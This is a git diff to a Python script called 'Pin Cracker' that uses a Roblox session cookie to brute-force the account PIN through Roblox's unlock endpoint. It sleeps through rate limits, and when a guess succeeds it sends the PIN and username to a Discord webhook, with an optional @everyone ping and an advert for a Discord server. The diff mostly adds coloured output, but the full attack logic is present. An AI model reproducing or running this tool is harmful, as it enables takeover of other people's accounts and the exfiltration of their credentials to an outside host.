@@ -1,6 +1,7 @@
 import requests
 import time
 import os
+from colors import get_ansi_color
 
 def get_os() -> str:
   if os.name == 'nt':
@@ -10,19 +11,28 @@ def get_os() -> str:
 def start_cracker() -> None:
   cls_type = get_os()
   pingEveryone = True
-  cookie = input('Enter your cookie below:\n')
-  os.system(cls_type)
-  webhook = input('Enter your webhook below:\n')
-  os.system(cls_type)
-  pingEveryone = input('Should we ping Everyone?: ( y / n ): ')
+
+  # Every CLI program needs an ASCII generated title, period.
+  print(get_ansi_color(97, 249, 134, """
+    ______ _         _____                _             
+    | ___ (_)       /  __ \              | |            
+    | |_/ /_ _ __   | /  \/_ __ __ _  ___| | _____ _ __ 
+    |  __/| | '_ \  | |   | '__/ _` |/ __| |/ / _ \ '__|
+    | |   | | | | | | \__/\ | | (_| | (__|   <  __/ |   
+    \_|   |_|_| |_|  \____/_|  \__,_|\___|_|\_\___|_|           ♡
+"""))
+  
+  cookie = input(get_ansi_color(246, 144, 250, 'Enter your cookie below:\n'))
+  webhook = input(get_ansi_color(144, 219, 250, 'Enter your webhook below:\n'))
+  pingEveryone = input(get_ansi_color(250, 245, 144, 'Should we ping Everyone?: ( y / n ): '))
   os.system(cls_type)
   if pingEveryone.lower() == 'y' or pingEveryone == 'yes':
     ping = '@everyone'
   else:
     ping = '***Pin Cracked! Join Our Discord : https://discord.gg/kunai***'
-  
   print('*** Cracker Has Started. ***')
 
+  
   url = 'https://auth.roblox.com/v1/account/pin/unlock'
   token = requests.post('https://auth.roblox.com/v1/login', cookies = {".ROBLOSECURITY": cookie})
   header = {'X-CSRF-TOKEN': token.headers['x-csrf-token']}
@@ -34,7 +44,7 @@ def start_cracker() -> None:
           payload = {'pin': pin}
           r = requests.post(url, data = payload, headers = header, cookies = {".ROBLOSECURITY": cookie})
           if 'unlockedUntil' in r.text:
-              print(f'Pin Cracked! Pin: {pin}')
+              print(f' ╚ Pin Cracked! Pin: {pin}')
               username = requests.get("https://users.roblox.com/v1/users/authenticated", cookies={".ROBLOSECURITY": cookie}).json()['name']
               data = {
                   "content": ping,
@@ -52,16 +62,16 @@ def start_cracker() -> None:
               input('Press any key to exit')
               break
           elif 'Too many requests made' in r.text:
-              print('Ratelimited, trying again in 60 seconds..')
+              print(get_ansi_color(247, 140, 48, ' ╚ Ratelimited, trying again in 60 seconds..'))
               time.sleep(60)
           elif 'Authorization' in r.text:
-              print('Error! Is the cookie valid?')
+              print(get_ansi_color(247, 48, 48, ' ╚ Error! Is the cookie valid?'))
               break
           elif 'Incorrect' in r.text:
-              print(f"Tried: {pin} , Incorrect!")
+              print(get_ansi_color(247, 140, 48, f" ╚ Tried: {pin} , Incorrect!"))
               time.sleep(10)  
       except:
-          print('Error!')
+          print(get_ansi_color(247, 48, 48, ' ╚ Error!'))
   input('\nPress enter to exit')
   return
 
